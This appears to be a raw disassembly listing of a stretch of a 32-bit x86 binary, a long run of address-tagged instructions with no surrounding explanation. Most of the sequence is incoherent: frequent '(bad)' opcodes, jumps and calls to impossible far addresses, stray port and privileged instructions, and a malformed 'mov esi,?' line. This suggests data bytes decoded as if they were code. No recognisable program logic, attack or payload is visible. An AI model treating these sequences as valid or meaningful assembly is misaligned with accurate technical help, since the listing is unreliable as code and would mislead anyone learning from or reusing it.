  40a40d:	jmp    0x6828ab82
  40a412:	stc    
  40a413:	(bad)  
  40a414:	jmp    esi
  40a416:	mov    edx,0x88b9ff91
  40a41b:	test   dl,al
  40a41d:	enter  0xfef6,0x50
  40a421:	cdq    
  40a422:	mov    al,0xbb
  40a424:	(bad)  
  40a425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a426:	lock or ebp,eax
  40a429:	mov    dh,0x7d
  40a42b:	add    eax,DWORD PTR [eax]
  40a42d:	sub    bl,dl
  40a42f:	sti    
  40a430:	test   dl,ah
  40a432:	or     BYTE PTR [ebx],cl
  40a434:	call   DWORD PTR [eax-0x39]
  40a437:	dec    esi
  40a438:	dec    BYTE PTR [eax+0x19]
  40a43b:	sbb    ah,BYTE PTR [ebx+ecx*8]
  40a43e:	sbb    DWORD PTR [ebx],eax
  40a440:	push   edx
  40a442:	popa   
  40a443:	or     bh,bh
  40a445:	xor    BYTE PTR [edx+0x7f],al
  40a448:	xchg   edx,eax
  40a449:	sub    BYTE PTR [ecx],bh
  40a44b:	cmp    eax,0xb019afc2
  40a450:	mov    cl,BYTE PTR [ebx]
  40a452:	dec    ecx
  40a453:	xchg   ecx,eax
  40a454:	or     edi,edi
  40a456:	fs jb  0x40a458
	...
  40a46d:	add    BYTE PTR [eax],cl
  40a46f:	and    eax,0xc9b07443
  40a474:	mov    bl,0xfe
  40a476:	jb     0x40a489
  40a478:	sbb    ebp,DWORD PTR [ebx-0x17f48f0f]
  40a47e:	jle    0x40a40b
  40a480:	or     bh,bh
  40a482:	out    dx,al
  40a483:	pop    ebx
  40a484:	cld    
  40a485:	push   DWORD PTR [ebx-0x6c]
  40a488:	pop    ss
  40a489:	sub    ebx,0xffffff8d
  40a48c:	popf   
  40a48d:	(bad)  
  40a48e:	cmp    cl,BYTE PTR ds:[edx]
  40a491:	jne    0x40a442
  40a493:	mov    cl,0x7e
  40a495:	(bad)  
  40a496:	mov    eax,0xb3457ca8
  40a49b:	inc    ebx
  40a49c:	in     eax,dx
  40a49d:	(bad)  
  40a49e:	xor    ah,BYTE PTR [ecx]
  40a4a0:	sbb    edi,DWORD PTR [edi+0x6a0ac0a0]
  40a4a6:	(bad)  
  40a4a7:	enter  0x790,0x7f
  40a4ab:	xchg   BYTE PTR [edx],cl
  40a4ad:	dec    DWORD PTR [eax-0x50118bd]
  40a4b3:	add    dh,cl
  40a4b5:	sbb    ecx,DWORD PTR [edi+eax*1+0x1e]
  40a4b9:	or     edi,ebp
  40a4bb:	add    al,BYTE PTR [ecx-0x173e547f]
  40a4c1:	fwait
  40a4c2:	rol    dh,cl
  40a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c5:	add    ebx,DWORD PTR [eax-0x33]
  40a4c8:	js     0x40a4a6
  40a4ca:	out    0x2,eax
  40a4cc:	add    edi,edx
  40a4ce:	xor    eax,DWORD PTR [edi]
  40a4d0:	out    dx,al
  40a4d1:	inc    BYTE PTR [eax]
	...
  40a4e7:	add    BYTE PTR [esi-0x613f4c04],cl
  40a4ed:	sbb    al,0xc5
  40a4ef:	xor    BYTE PTR [edi+0x1aa090d5],dh
  40a4f5:	test   al,0x7
  40a4f7:	and    BYTE PTR [edi],al
  40a4f9:	rol    DWORD PTR [esi],1
  40a4fb:	xor    eax,0x109dbe07
  40a500:	lahf   
  40a501:	pop    esi
  40a502:	(bad)  
  40a503:	add    al,BYTE PTR [bx+di-0x66]
  40a507:	mov    esp,0xb20ae8c1
  40a50c:	xchg   edx,eax
  40a50d:	iret   
  40a50e:	(bad)  
  40a50f:	lock push ds
  40a511:	in     eax,dx
  40a512:	jo     0x40a4fc
  40a514:	push   es
  40a515:	loop   0x40a55a
  40a517:	pop    ebx
  40a518:	out    dx,al
  40a519:	sbb    BYTE PTR [esp+eax*2+0x770427c6],bl
  40a520:	pop    es
  40a521:	cld    
  40a522:	sti    
  40a523:	shl    BYTE PTR [ebx+0x6d],0xa
  40a527:	rcr    BYTE PTR [ecx],0x3d
  40a52a:	je     0x40a4e4
  40a52c:	push   es
  40a52d:	rol    DWORD PTR [ebx],cl
  40a52f:	cmp    eax,0x6b5bc102
  40a534:	shr    eax,0x9b
  40a537:	mov    al,ds:0x8f83e906
  40a53c:	sub    al,0x55
  40a53e:	or     dl,BYTE PTR [eax+0x1828fffa]
  40a544:	loop   0x40a595
  40a546:	cdq    
  40a547:	pushf  
  40a548:	test   DWORD PTR [edx+0x26],ebx
	...
  40a55e:	add    BYTE PTR [eax],al
  40a560:	lods   eax,DWORD PTR ds:[esi]
  40a561:	stc    
  40a562:	mov    edi,0x67b68095
  40a567:	lea    esp,[eax-0x3d]
  40a56a:	(bad)  
  40a56b:	mov    eax,0x11078fad
  40a570:	add    BYTE PTR [edx],cl
  40a572:	(bad)  
  40a573:	(bad)  
  40a574:	lods   eax,DWORD PTR ds:[esi]
  40a575:	fs xchg ecx,eax
  40a577:	neg    BYTE PTR [esi-0x52a766e6]
  40a57d:	add    eax,0x5af5cff
  40a582:	jne    0x40a575
  40a584:	mov    esi,?
  40a586:	mov    ss,esi
  40a588:	sahf   
  40a589:	cmp    eax,edx
  40a58b:	in     eax,0xa4
  40a58d:	scas   eax,DWORD PTR es:[edi]
  40a58e:	mov    dl,ch
  40a590:	and    al,0x3f
  40a592:	in     al,dx
  40a593:	mov    dh,0x9e
  40a595:	add    eax,0xb29f2c8d
  40a59a:	(bad)  
  40a59b:	xor    al,0xfb
  40a59d:	add    al,0x75
  40a59f:	cmc    
  40a5a0:	pushf  
  40a5a1:	xor    BYTE PTR [ebx-0x17],ah
  40a5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a5:	stc    
  40a5a6:	mov    edi,0x3969e6
  40a5ab:	jmp    0x8185e354
  40a5b0:	mov    ds:0x67e90002,eax
  40a5b5:	mov    edi,0x2a676f3
  40a5ba:	add    BYTE PTR [ebx],al
  40a5bc:	stos   DWORD PTR es:[edi],eax
  40a5bd:	cwde   
  40a5be:	call   edx
  40a5c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c1:	cwde   
  40a5c2:	jmp    FWORD PTR [ebx+0x0]
	...
  40a5d9:	lock adc DWORD PTR [eax+0x64],edx
  40a5dd:	sub    BYTE PTR [esi],cl
  40a5df:	test   DWORD PTR [esi-0x52],0x5b00feb2
  40a5e6:	stc    
  40a5e7:	(bad)  
  40a5e8:	jne    0x40a5bc
  40a5ea:	out    0xa3,al
  40a5ec:	arpl   WORD PTR [esi+0x1],di
  40a5ef:	or     eax,eax
  40a5f1:	cmp    al,BYTE PTR [eax+ebp*8]
  40a5f4:	mov    cs,WORD PTR [esi-0x6097ffff]
  40a5fa:	es inc eax
  40a5fc:	add    BYTE PTR [ecx-0x7617f08b],dl
  40a602:	xchg   edx,eax
  40a603:	(bad)  
  40a604:	(bad)  
  40a605:	ds xchg bh,cl
  40a608:	(bad)  
  40a609:	retf   
  40a60a:	repnz idiv bh
  40a60d:	push   ecx
  40a60e:	push   ecx
  40a60f:	push   ecx
  40a610:	call   0x3f388e
  40a615:	mov    bh,0x84
  40a617:	out    dx,eax
  40a618:	not    DWORD PTR [ecx-0x6]
  40a61b:	out    0xd,eax
  40a61d:	scas   eax,DWORD PTR es:[edi]
  40a61e:	cli    
  40a61f:	(bad)  
  40a620:	push   0xe
  40a622:	imul   ebp,ebp,0xfefecf3c
  40a628:	mov    ch,0x4e
  40a62a:	repnz (bad) 
  40a62c:	call   DWORD PTR [ecx+0x74]
  40a62f:	or     ebp,eax
  40a631:	ficom  WORD PTR [esi+edi*8-0x147b8801]
  40a638:	not    DWORD PTR [ecx]
  40a63a:	cli    
  40a63b:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  40a652:	and    dh,dl
  40a654:	(bad)  
  40a655:	dec    esi
  40a657:	je     0x40a66b
  40a659:	push   0xbeef00cf
  40a65e:	push   ecx
  40a65f:	mov    ah,0xeb
  40a661:	not    DWORD PTR [ecx-0x6]
  40a664:	(bad)  
  40a665:	jne    0x40a62d
  40a667:	call   0xfa825902
  40a66c:	(bad)  
  40a66d:	mov    ch,0x62
  40a66f:	repnz (bad) 
  40a671:	jmp    DWORD PTR [edi-0x5f6fc43d]
  40a677:	mov    ch,0x7
  40a679:	mov    ch,0x97
  40a67b:	lds    eax,FWORD PTR [edi]
  40a67d:	call   DWORD PTR [eax+0x12fef74f]
  40a683:	and    bl,BYTE PTR [ebx]
  40a685:	xor    BYTE PTR [eax+0x32ff07d5],al
  40a68b:	jmp    0x9057:0xf270ff0f
  40a692:	push   0x5f4507ed
  40a697:	add    edi,DWORD PTR [edi+0x7fd58fe]
  40a69d:	jne    0x40a6f2
  40a69f:	repnz or DWORD PTR [edx-0x59],esp
  40a6a3:	sbb    DWORD PTR [edx],edi
  40a6a5:	ret    0x19b3
  40a6a8:	scas   al,BYTE PTR es:[edi]
  40a6a9:	mov    cl,BYTE PTR [ebx-0x65]
  40a6ac:	aas    
  40a6ad:	call   0x8d47cbea
  40a6b2:	loop   0x40a6e1
  40a6b4:	mov    ah,0xfe
	...
  40a6ca:	add    BYTE PTR [edx-0x548af9f7],bl
  40a6d0:	xor    DWORD PTR [ebx],esp
  40a6d2:	bound  esp,QWORD PTR [edi-0x674005e7]
  40a6d8:	xchg   esi,eax
  40a6d9:	in     eax,0x0
  40a6db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6dc:	sbb    DWORD PTR [esi],edi
  40a6de:	inc    ebp
  40a6df:	call   FWORD PTR [ecx]
  40a6e1:	add    eax,DWORD PTR [eax]
  40a6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6e4:	pop    esp
  40a6e5:	shl    ebx,0xe8
  40a6e8:	adc    al,0x3
  40a6ea:	add    BYTE PTR [ebp+0x19],cl
  40a6ed:	cdq    
  40a6ee:	dec    DWORD PTR [esi+0x19]
  40a6f1:	cdq    
  40a6f2:	jmp    DWORD PTR [ebx]
  40a6f4:	fisttp WORD PTR [edi]
  40a6f6:	push   eax
  40a6f7:	sbb    dl,BYTE PTR [edi-0x6b3f08f1]
  40a6fd:	mov    bl,0xfe
  40a6ff:	xor    al,BYTE PTR [edx]
  40a701:	popa   
  40a702:	pop    es
  40a703:	cmp    al,BYTE PTR [esi]
  40a705:	push   ecx
  40a706:	push   ecx
  40a707:	inc    ebp
  40a708:	add    ch,cl
  40a70a:	cli    
  40a70b:	pusha  
  40a70c:	mov    fs,ebx
  40a70e:	sbb    al,0x86
  40a710:	add    ch,cl
  40a712:	add    edi,edi
  40a714:	and    DWORD PTR [ecx],edx
  40a716:	lds    ecx,FWORD PTR [eax-0x770c43fc]
  40a71c:	sub    bl,BYTE PTR [edx+0x7]
  40a71f:	js     0x40a6d3
  40a721:	jno    0x40a757
  40a723:	and    bh,BYTE PTR [ebp+0x15]
  40a726:	punpckhbw mm0,QWORD PTR [ebx]
  40a729:	mov    ecx,0x7a3a48b1
  40a72e:	pop    es
	...
  40a743:	add    BYTE PTR [eax+0x79],bl
  40a746:	ins    BYTE PTR es:[edi],dx
  40a747:	adc    al,0x58
  40a749:	add    edi,esi
  40a74b:	sbb    ebp,DWORD PTR [ecx-0x32f9098e]
  40a751:	add    al,BYTE PTR [ebx-0x26b2c7fd]
  40a757:	push   cs
  40a758:	xor    BYTE PTR [ebx],al
  40a75a:	ficom  WORD PTR [eax+0x730d1a9c]
  40a760:	and    BYTE PTR [ebx],al
  40a762:	pusha  
  40a763:	or     BYTE PTR [ebx],0xb
  40a766:	mov    BYTE PTR [esi],0x10
  40a769:	dec    ebp
  40a76a:	int    0xe
  40a76c:	or     BYTE PTR [ebx],al
  40a76e:	sar    DWORD PTR [edi],0x1e
  40a771:	add    ebp,DWORD PTR [esi+0x98e38fa]
  40a777:	mov    ah,0x1f
  40a779:	jge    0x40a70c
  40a77b:	push   cs
  40a77c:	call   0xcf913d83
  40a781:	or     cl,BYTE PTR [esi+0x5c00cf06]
  40a787:	push   es
  40a788:	shl    dh,1
  40a78a:	test   al,0x8f
  40a78c:	pusha  
  40a78d:	call   0x1be:0x13a4eaff
  40a794:	adc    eax,0xa9e940c6
  40a799:	dec    ebp
  40a79a:	call   0xff4448f5
  40a79f:	fcomp  QWORD PTR [edx+ebp*8+0x1a19597]
  40a7a6:	push   0xeb
	...
  40a7bb:	add    BYTE PTR [eax],al
  40a7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7be:	icebp  
  40a7bf:	mov    ebp,0x414026d1
  40a7c4:	jmp    0x37285f72
  40a7c9:	mov    eax,ds:0x6c9cff01
  40a7ce:	jmp    0xe968:0x1a1557f
  40a7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7d6:	icebp  
  40a7d7:	mov    ebp,0x413e9a81
  40a7dc:	jmp    0xf7285f8a
  40a7e1:	mov    ds:0x3c7cff01,al
  40a7e6:	jmp    0x7de8:0x1a13567
  40a7ed:	mov    edx,0xd8deff01
  40a7f2:	out    dx,al
  40a7f3:	not    dh
  40a7f5:	stos   BYTE PTR es:[edi],al
  40a7f6:	jmp    0x7cff:0x1a25e88
  40a7fd:	mov    ebx,0xa2befef9
  40a802:	ja     0x40a810
  40a804:	mov    dh,0x30
  40a806:	or     ch,al
  40a808:	mov    WORD PTR [ecx+0x60a6ff01],fs
  40a80e:	repnz neg BYTE PTR [esi+0x666ceaa2]
  40a815:	stos   BYTE PTR es:[edi],al
  40a816:	add    edi,edi
  40a818:	and    al,0xab
  40a81a:	jmp    0x40a80c
  40a81c:	add    BYTE PTR [eax],ch
  40a81e:	or     bh,bh
  40a820:	inc    DWORD PTR [eax]
	...
  40a836:	ror    DWORD PTR [ecx],cl
  40a838:	call   0x4757f4
  40a83d:	leave  
  40a83e:	or     al,0xfb
  40a840:	(bad)  
  40a841:	push   esp
  40a842:	xor    eax,0x4ac4831a
  40a847:	pushf  
  40a848:	(bad)  
  40a849:	imul   ebp,DWORD PTR [edi+eax*1-0x7819f78b],0x7de9ff8a
  40a854:	inc    ebp
  40a855:	cld    
  40a856:	jbe    0x40a85d
  40a858:	add    bh,ch
  40a85a:	clc    
  40a85b:	sahf   
  40a85c:	les    edi,FWORD PTR [edi+ecx*2]
  40a85f:	add    eax,0xc48ad668
  40a864:	(bad)  
  40a865:	(bad)  
  40a866:	adc    edi,ebp
  40a868:	out    0x47,al
  40a86a:	add    cl,BYTE PTR [eax]
  40a86c:	jmp    FWORD PTR [eax-0x78]
  40a86f:	retf   0x3f
  40a872:	test   eax,0xff296ed1
  40a877:	add    al,0xff
  40a879:	jne    0x40a8c1
  40a87b:	sbb    eax,0x649fd90
  40a880:	push   0xfec58ade
  40a885:	addr16 cmp al,0x5
  40a888:	add    BYTE PTR [eax-0x17f97007],al
  40a88e:	push   0x76ffff09
  40a893:	adc    al,0x3c
  40a895:	inc    ecx
  40a896:	(bad)  
  40a897:	pushf  
	...
  40a8ac:	add    BYTE PTR [eax],al
  40a8ae:	add    BYTE PTR [esi],cl
  40a8b0:	test   esi,edi
  40a8b2:	jne    0x40a8ba
  40a8b4:	sbb    eax,0x649fe5b
  40a8b9:	push   0xfec3cb32
  40a8be:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40a8c0:	in     eax,dx
  40a8c1:	add    al,BYTE PTR [eax]
  40a8c3:	daa    
  40a8c4:	nop
  40a8c5:	lea    eax,[edi]
  40a8c7:	mov    edi,0xc8ff0631
  40a8cc:	jg     0x40a85c
  40a8ce:	sti    
  40a8cf:	sar    ch,0xfa
  40a8d2:	out    0x50,eax
  40a8d4:	pop    edi
  40a8d5:	add    al,0xff
  40a8d7:	fisubr WORD PTR [edi+edi*8]
  40a8da:	call   DWORD PTR [ebx+0x74]
  40a8dd:	pop    ss
  40a8de:	call   FWORD PTR [edx]
  40a8e0:	out    0x1a,al
  40a8e2:	sbb    DWORD PTR [ecx+edx*2],esi
  40a8e5:	add    al,0xb
  40a8e7:	addr16 mov esi,0xff3c67c9
  40a8ed:	sar    edi,0xf0
  40a8f0:	inc    ecx
  40a8f1:	push   ebp
  40a8f2:	xchg   edx,eax
  40a8f3:	js     0x40a926
  40a8f5:	mov    bl,0x4f
  40a8f7:	(bad)  
  40a8f8:	jmp    0x926a97ff
  40a8fd:	je     0x40a93c
  40a8ff:	out    0xe9,al
  40a901:	mov    dl,0xfe
  40a903:	shl    cl,cl
  40a905:	sbb    dh,BYTE PTR [ebp+0x14]
  40a908:	or     DWORD PTR [eax+ebx*2],eax
  40a90b:	mov    edi,0x1ef02ea
  40a910:	and    BYTE PTR [ebp+0x3d],0x0
	...
  40a928:	out    0xe9,al
  40a92a:	mov    dl,0xfe
  40a92c:	mov    edx,0xf460eaf1
  40a931:	loopne 0x40a935
  40a933:	call   0xff44116a
  40a938:	out    dx,al
  40a939:	stos   DWORD PTR es:[edi],eax
  40a93a:	or     eax,DWORD PTR [eax]
  40a93c:	jp     0x40a9b2
  40a93e:	lock and bl,0xbd
  40a942:	ins    DWORD PTR es:[edi],dx
  40a943:	add    BYTE PTR [ebp-0x508afcf4],cl
  40a949:	shl    DWORD PTR [edx-0x59fd0f76],0x8d
  40a950:	arpl   si,di
  40a952:	adc    bl,BYTE PTR [esi]
  40a954:	loopne 0x40a9cb
  40a956:	loope  0x40a943
  40a958:	xor    eax,DWORD PTR [eax]
  40a95a:	mov    es,WORD PTR [ebx]
  40a95c:	cmp    eax,0x9f798623
  40a961:	jmp    0x2002:0xffc00371
  40a968:	mov    eax,0x27ebe175
  40a96d:	add    BYTE PTR [esi+0x3],ah
  40a970:	test   al,0x75
  40a972:	pop    ebp
  40a973:	add    ebx,DWORD PTR [edx]
  40a975:	or     eax,DWORD PTR [ecx-0x33]
  40a978:	sub    eax,0x66cd4dff
  40a97d:	push   es
  40a97e:	jmp    0x9a2ec5db
  40a983:	retf   0x65ab
  40a986:	test   BYTE PTR [edi+eiz*4+0x2],0xe9
  40a98b:	add    eax,DWORD PTR [eax]
	...
  40a9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9a2:	sub    eax,DWORD PTR [edx+0x3]
  40a9a5:	repnz or dl,BYTE PTR [ecx]
  40a9a8:	aaa    
  40a9a9:	add    BYTE PTR [ebx],al
  40a9ab:	jmp    0x6a4b9d3e
  40a9b0:	cld    
  40a9b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9b2:	js     0x40a98c
  40a9b4:	push   es
  40a9b5:	ja     0x40a93a
  40a9b7:	adc    al,BYTE PTR [esi]
  40a9b9:	leave  
  40a9ba:	xor    DWORD PTR [edx-0x1b8a24a1],0x45046869
  40a9c4:	add    al,0x28
  40a9c6:	jne    0x40a9b5
  40a9c8:	jmp    0x40a9b4
  40a9ca:	pop    esi
  40a9cb:	jmp    0xf8d38d3
  40a9d0:	inc    ebp
  40a9d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9d2:	push   0xffffff83
  40a9d4:	inc    eax
  40a9d5:	data16 add dl,cl
  40a9d8:	cdq    
  40a9d9:	sbb    bh,bh
  40a9db:	push   DWORD PTR [ebp+0x4473c2a9]
  40a9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9e2:	jne    0x40a9ec
  40a9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e5:	(bad)  
  40a9e6:	dec    esp
  40a9e7:	sub    BYTE PTR ds:[ebx-0x56123c7d],ch
  40a9ee:	ret    0x3474
  40a9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f2:	adc    eax,0x263c75a
  40a9f7:	mov    ds:0x416404,eax
  40a9fc:	push   0x67
  40a9fe:	gs aas 
  40aa00:	sub    BYTE PTR [ebx+0xf17502],ch
	...
  40aa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa1b:	adc    eax,0x2ea1f4e
  40aa20:	jmp    0x40aa32
  40aa22:	or     DWORD PTR [ebx],eax
  40aa24:	push   0xffffffe8
  40aa26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa27:	aaa    
  40aa28:	gs push es
  40aa2a:	loop   0x40aa2e
  40aa2c:	call   esp
  40aa2e:	push   es
  40aa2f:	cmp    eax,0xc221e941
  40aa34:	or     esp,edx
  40aa36:	fs jb  0x40aa5a
  40aa39:	es scas eax,DWORD PTR es:[edi]
  40aa3b:	addr16 aas 
  40aa3d:	test   al,0xa4
  40aa3f:	std    
  40aa40:	adc    al,0x8f
  40aa42:	out    0x43,al
  40aa44:	add    BYTE PTR [edx+0x68],ch
  40aa47:	add    bh,bh
  40aa49:	fdivr  st(6),st
  40aa4b:	cmp    al,0x41
  40aa4d:	jmp    0xb6a5b1bf
  40aa52:	jecxz  0x40aa56
  40aa54:	add    cl,ch
  40aa56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa57:	add    ch,bl
  40aa59:	call   0x43033441
  40aa5e:	in     al,dx
  40aa5f:	ret    
  40aa60:	pop    es
  40aa61:	jmp    0xea5e989
  40aa66:	add    al,BYTE PTR fs:[eax]
  40aa69:	add    dl,cl
  40aa6b:	and    edi,edi
  40aa6d:	xor    eax,0x41436b
  40aa72:	xor    DWORD PTR [esi],edx
  40aa74:	ds mov di,0x8306
  40aa79:	(bad)  
  40aa7a:	cli    
  40aa7b:	add    dl,BYTE PTR ds:0x4e
	...
  40aa91:	add    BYTE PTR [eax],al
  40aa93:	add    BYTE PTR [ecx+0x0],al
  40aa96:	(bad)  
  40aa97:	retf   
  40aa98:	fs aas 
  40aa9a:	inc    ecx
  40aa9b:	mov    esi,0xbe000001
  40aaa0:	(bad)  
  40aaa1:	push   ebx
  40aaa2:	mov    esi,DWORD PTR [edx]
  40aaa4:	mov    dl,al
  40aaa6:	lock popf 
  40aaa8:	pop    DWORD PTR [ebx+0x8]
  40aaab:	(bad)
  40aaae:	or     edi,DWORD PTR ds:0x7a000c7d
  40aab4:	add    al,0x80
  40aab6:	cmp    BYTE PTR [esi-0x41d4f88c],cl
  40aabc:	pop    edi
  40aabd:	leave  
  40aabe:	ret    0x196
  40aac1:	cmp    BYTE PTR [eax],0x40
  40aac4:	jne    0x40aad6
  40aac6:	xor    DWORD PTR [ebx+0x64],0x3f
  40aaca:	inc    ecx
  40aacb:	jle    0x40aace
  40aacd:	jne    0x40aad6
  40aacf:	push   ebp
  40aad0:	rcr    DWORD PTR [ecx-0x37],0x8c
  40aad4:	push   cs
  40aad5:	add    BYTE PTR [eax+0x3e748376],al
  40aadb:	lds    edx,FWORD PTR [ebp+0xc]
  40aade:	dec    edx
  40aadf:	mov    ebp,0x9c0b01e4
  40aae4:	jne    0x40aaec
  40aae6:	xor    DWORD PTR [ebx+0x4a75010d],0x2e
  40aaed:	shr    bl,0x9a
  40aaf0:	add    ecx,DWORD PTR [ebp+0xc]
  40aaf3:	xchg   ebp,eax
  40aaf4:	inc    esp
  40aaf5:	or     al,0x5
	...
  40ab0b:	add    BYTE PTR [edi-0x58fff915],ah
  40ab11:	stos   BYTE PTR es:[edi],al
  40ab12:	loop   0x40ab15
  40ab14:	ja     0x40aae9
  40ab16:	sbb    al,0x8d
  40ab18:	add    BYTE PTR [edx+edx*2+0x44e3528b],bh
  40ab1f:	push   eax
  40ab20:	lock xor eax,0xbdff5210
  40ab26:	call   0xe5c9:0x5d42e0fe
  40ab2d:	loop   0x40ab31
  40ab2f:	sub    ebp,esp
  40ab31:	mov    esi,DWORD PTR [ebp+0xc]
  40ab34:	enter  0xafd,0x6a
  40ab38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab39:	adc    DWORD PTR [edi+edi*8],eax
  40ab3c:	xchg   edx,eax
  40ab3d:	sbb    DWORD PTR [edx+0x41],eax
  40ab40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab41:	push   0x2b9c0fc7
  40ab46:	ja     0x40abad
  40ab48:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40ab4a:	(bad)  
  40ab4b:	imul   ebp,DWORD PTR [ebx-0x80fb99a],0x888bf641
  40ab55:	inc    ebp
  40ab56:	ins    DWORD PTR es:[edi],dx
  40ab57:	add    BYTE PTR [edx],dh
  40ab59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5a:	repnz dec edi
  40ab5c:	js     0x40ab1d
  40ab5e:	(bad)  
  40ab5f:	(bad)  
  40ab60:	call   0xc768:0xa74140c7
  40ab67:	or     ebp,DWORD PTR [ecx+ebp*1-0x50d5cc8a]
  40ab6e:	repnz add BYTE PTR [eax],0x0
	...
  40ab82:	add    BYTE PTR [eax],al
  40ab84:	add    bh,cl
  40ab86:	in     eax,0x2
  40ab88:	je     0x40ab36
  40ab8a:	jo     0x40abcf
  40ab8c:	or     bh,ah
  40ab8e:	cdq    
  40ab8f:	jmp    0x4f8a:0xfef52bb4
  40ab96:	pop    edi
  40ab97:	inc    esi
  40ab98:	lock sub BYTE PTR [ebx],al
  40ab9b:	pop    ecx
  40ab9c:	or     al,0x74
  40ab9e:	sti    
  40ab9f:	pop    eax
  40aba0:	or     BYTE PTR [edi],cl
  40aba2:	fsub   DWORD PTR [edi+edi*8+0x11]
  40aba6:	imul   ebp,ecx,0x18f26390
  40abac:	call   FWORD PTR [ebx-0x58bb00ac]
  40abb2:	jg     0x40ab60
  40abb4:	or     al,0x7d
  40abb6:	add    DWORD PTR [esi-0x4041487],ebp
  40abbc:	push   ebp
  40abbd:	mov    eax,ds:0xe482e941
  40abc2:	or     ah,BYTE PTR [edx-0x3d]
  40abc5:	ins    DWORD PTR es:[edi],dx
  40abc6:	leave  
  40abc7:	stos   BYTE PTR es:[edi],al
  40abc8:	or     al,0xa7
  40abca:	push   ebp
  40abcb:	jb     0x40abbd
  40abcd:	shl    DWORD PTR [ebp-0x13],0xfe
  40abd1:	xor    ecx,DWORD PTR [edx]
  40abd3:	jbe    0x40abee
  40abd5:	push   edx
  40abd6:	cmp    ebp,DWORD PTR [eax]
  40abd8:	add    al,0x24
  40abda:	(bad)  
  40abdb:	lock push ebx
  40abdd:	mov    al,ds:0x13feed75
  40abe2:	or     edx,DWORD PTR [esi+0x19]
  40abe5:	out    dx,al
  40abe6:	cmp    ebp,DWORD PTR [eax+0x3]
	...
  40abfc:	add    BYTE PTR [eax],al
  40abfe:	and    al,0xc6
  40ac00:	lock mov bl,bl
  40ac03:	adc    dh,BYTE PTR [eax+0x2]
  40ac06:	(bad)  
  40ac08:	sub    dl,BYTE PTR [eax]
  40ac0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac0b:	push   ebp
  40ac0c:	(bad)  
  40ac0d:	lock and eax,0xdbff10c6
  40ac13:	push   cs
  40ac14:	adc    DWORD PTR [ebx],eax
  40ac16:	ss sti 
  40ac18:	adc    eax,0xe575670b
  40ac1d:	int3   
  40ac1e:	data16 adc ch,cl
  40ac21:	(bad)  
  40ac22:	mov    ebx,0xae0110e
  40ac27:	sti    
  40ac28:	push   ebp
  40ac2a:	popf   
  40ac2b:	ret    0xe573
  40ac2e:	pop    ebx
  40ac2f:	ror    DWORD PTR [edi],0xe9
  40ac32:	and    DWORD PTR [esi+0x14],esi
  40ac35:	ficomp WORD PTR [edi-0x585317ee]
  40ac3b:	sti    
  40ac3c:	(bad)  
  40ac3d:	loop   0x40ac23
  40ac3f:	jne    0x40ac45
  40ac41:	mov    al,0xe6
  40ac43:	or     al,BYTE PTR [eax]
  40ac45:	push   ecx
  40ac46:	push   0x3b
  40ac48:	inc    ecx
  40ac49:	jmp    0x287e86ca
  40ac4e:	mov    ds:0xe17f8bea,eax
  40ac53:	sti    
  40ac54:	or     ch,BYTE PTR [ecx+0x20680b5f]
  40ac5a:	nop
  40ac5b:	inc    ecx
  40ac5c:	add    BYTE PTR [ecx],al
  40ac5e:	cmp    eax,0xe9413c
	...
  40ac77:	int3   
  40ac78:	jns    0x40ac10
  40ac7a:	jle    0x40ac35
  40ac7c:	pop    es
  40ac7d:	shl    dh,0x28
  40ac80:	lods   al,BYTE PTR ds:[esi]
  40ac81:	add    cl,ch
  40ac83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac84:	lea    eax,[ebp+eiz*2-0xc]
  40ac88:	stc    
  40ac89:	je     0x40ac78
  40ac8b:	cdq    
  40ac8c:	cmovns edx,DWORD PTR [esi]
  40ac8f:	jmp    0xc00d:0x9c258302
  40ac96:	imul   BYTE PTR [edi]
  40ac98:	xchg   ecx,eax
  40ac99:	add    cl,ch
  40ac9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac9c:	ins    BYTE PTR es:[edi],dx
  40ac9d:	add    BYTE PTR [edi+ebx*8-0x6],ah
  40aca1:	dec    edi
  40aca2:	ret    
  40aca3:	imul   esp,DWORD PTR [edx-0x27],0xff02ebe6
  40acaa:	xchg   esp,eax
  40acab:	pop    eax
  40acac:	stc    
  40acad:	adc    al,0xb8
  40acaf:	xchg   ecx,eax
  40acb0:	inc    ebx
  40acb1:	add    BYTE PTR [edx+0x60],ch
  40acb4:	push   ss
  40acb5:	or     eax,DWORD PTR [eax]
  40acb7:	mov    cs,WORD PTR [eax]
  40acb9:	test   DWORD PTR [edx+0x4f],ebp
  40acbc:	push   es
  40acbd:	add    bh,bh
  40acbf:	mov    bl,0xfd
  40acc1:	std    
  40acc2:	adc    eax,0x413913
  40acc7:	(bad)  
  40acc8:	retf   0x8302
  40accb:	push   es
  40accc:	imul   esi,DWORD PTR [ebp+eax*1-0x19],0x5a
  40acd1:	add    DWORD PTR [eax],eax
